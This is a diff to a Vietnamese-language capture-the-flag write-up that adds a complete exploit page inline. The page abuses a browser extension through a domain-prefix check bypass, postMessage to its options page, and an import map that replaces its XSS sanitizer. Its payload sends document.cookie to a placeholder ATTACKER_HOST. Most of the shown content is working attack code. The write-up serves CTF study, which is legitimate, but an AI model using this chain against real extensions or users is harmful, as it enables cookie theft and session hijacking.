@@ -78,6 +78,86 @@ POST /perchance  perchance=https://doc.rust-lang.org.<attacker>/         (Bug 1)
              doc.rust-lang.org -> đọc cookie flag -> gửi về attacker
 ```
 
-Trang khai thác: xem `solve/index.html` (sửa `ATTACKER_HOST` thành webhook của bạn, host tại domain dạng `doc.rust-lang.org.<something>` qua HTTPS, rồi submit URL đó vào `/perchance`). Cookie `flag` về webhook sau ~40s.
+Trang khai thác (sửa `ATTACKER_HOST` thành webhook của bạn, host tại domain dạng `doc.rust-lang.org.<something>` qua HTTPS, rồi submit URL đó vào `/perchance`; cookie `flag` về webhook sau ~40s):
+
+```html!
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title>perchance solver</title>
+<!--
+  Import map PHẢI có trong top document TRƯỚC khi bất kỳ module script nào chạy.
+  Content script (cs.js) của extension sau đó tiêm vào top frame này một
+  `<script type="module">import x from 'http://localhost:3000/jsxss.js'`.
+  Import map remap specifier đó sang module của ta: default export KHÔNG phải
+  filterXSS() thật mà là hàm trả HTML thô (chưa sanitize). cs.js lưu payload thô
+  đó vào `previous`, bypass hoàn toàn js-xss.
+
+  Thay ATTACKER_HOST bên dưới (trong data: URL) bằng webhook host của bạn.
+-->
+<script type="importmap">
+{
+  "imports": {
+    "http://localhost:3000/jsxss.js": "data:text/javascript,export%20default%20%28%29%3D%3E%22%3Cimg%20src%3Dx%20onerror%3D%5C%22location%3D%27https%3A%2F%2FATTACKER_HOST%2Fexfil%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%5C%22%3E%22%3B"
+  }
+}
+</script>
+</head>
+<body>
+<h1>perchance</h1>
+<script>
+// UUID cố định mà challenge pin extension vào (browser.ts firefoxUserPrefs).
+const EXT = '09a6c422-a354-447d-b4ea-185cb10be869';
+// options.html là web_accessible_resources: ["*"], nên trang nào cũng frame được.
+const OPT = `moz-extension://${EXT}/options.html`;
+
+// Trang này được host tại https://doc.rust-lang.org.<attacker>/ .
+// Qua được check phía server  url.startsWith('https://doc.rust-lang.org')
+// (thiếu dấu / cuối => domain-prefix confusion kinh điển).
+const OUR_ORIGIN = location.origin;   // vd https://doc.rust-lang.org.attacker.tld
+
+// Frame options.html rồi postMessage một URL. options.js -> updateConfig() set
+// storage.local.activateOn = new URL(msg).origin, miễn chuỗi chứa
+// 'https://doc.rust-lang.org/'. Nhờ vậy trỏ trigger tiêm của extension vào
+// BẤT KỲ origin nào ta muốn.
+function setActivateOn(newUrl) {
+  const f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.src = OPT;
+  f.onload = () => f.contentWindow.postMessage(newUrl, '*');
+  document.body.appendChild(f);
+}
+
+// STEP 1 -- trỏ activateOn về origin CỦA TA để cs.js chạy trên trang này.
+//           u.origin của chuỗi dưới == OUR_ORIGIN, và chứa substring bắt buộc.
+setActivateOn(OUR_ORIGIN + '/https://doc.rust-lang.org/');
+
+// STEP 2 -- tạo một document load có URL khớp (startsWith activateOn &&
+//           includes 'https://doc.rust-lang.org/'). webNavigation.onCompleted
+//           bắn -> extension tiêm cs.js vào TOP frame (chính ta). cs.js import
+//           module đã remap, window[nonce] thành hàm của ta; nó được gọi với
+//           location.href, giá trị trả THÔ được lưu vào `previous` qua message
+//           updateLastUrl (không check sender).
+setTimeout(() => {
+  const t = document.createElement('iframe');
+  t.style.display = 'none';
+  t.src = OUR_ORIGIN + '/trigger#https://doc.rust-lang.org/';
+  document.body.appendChild(t);
+}, 3000);
+
+// STEP 3 -- reset activateOn về origin docs thật để extension tiêm cs.js lần
+//           nữa khi ta landing trên doc.rust-lang.org thật.
+setTimeout(() => setActivateOn('https://doc.rust-lang.org/'), 8000);
+
+// STEP 4 -- điều hướng top frame sang trang /stable/std/ thật (path của cookie).
+//           cs.js chạy  elm.innerHTML = 'Previous: ' + previous , <img onerror>
+//           của ta bắn trong world của trang, đọc cookie `flag` (non-httpOnly)
+//           và exfil.
+setTimeout(() => { location = 'https://doc.rust-lang.org/stable/std/index.html'; }, 12000);
+</script>
+</body>
+</html>
+```
 
 ->Flag: `NNS{...}`
